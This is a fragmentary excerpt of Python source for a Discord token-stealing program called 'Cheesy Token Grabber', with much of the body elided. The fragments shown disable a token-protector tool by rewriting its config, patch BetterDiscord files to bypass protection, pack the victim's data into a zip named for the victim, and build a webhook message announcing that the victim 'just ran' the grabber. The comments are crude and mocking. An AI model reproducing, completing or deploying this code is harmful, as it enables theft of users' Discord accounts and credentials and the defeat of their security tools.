...
class CheesyTokenGrabberV2(Functions):
    def __init__(self):
        ...
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item[
                    "Cheedsy_just_shit_on_this_token_protector"
                ] = "https://pornhub.com"
            ...
            with open(config, "a") as f:
                f.write(
                    "\n\n//Cheesy just shit on this token protector | https://poop.com"
                )
    ...
    async def bypassBetterDiscord(self):
        ...
        if ntpath.exists(bd):
            ...
            with open(bd, "r", encoding="cp437", errors="ignore") as f:
                txt = f.read()
                content = txt.replace(x, "CheesyTheGoat")
...
{line_sep}
    ...
    def finish(self):
        ...
        _zipfile = ntpath.join(self.appdata, f"Cheesy.V3-[{Victim}].zip")
        ...
        embed = {
            ...
            "embeds": [
                {
                    "author": {
                        "name": f"*{Victim}* Just ran Cheesy Token Grabber.V3",
...
if __name__ == "__main__" and os.name == "nt":
    try:
        ...
        os._exit(0)
    asyncio.run(CheesyTokenGrabberV2().init())
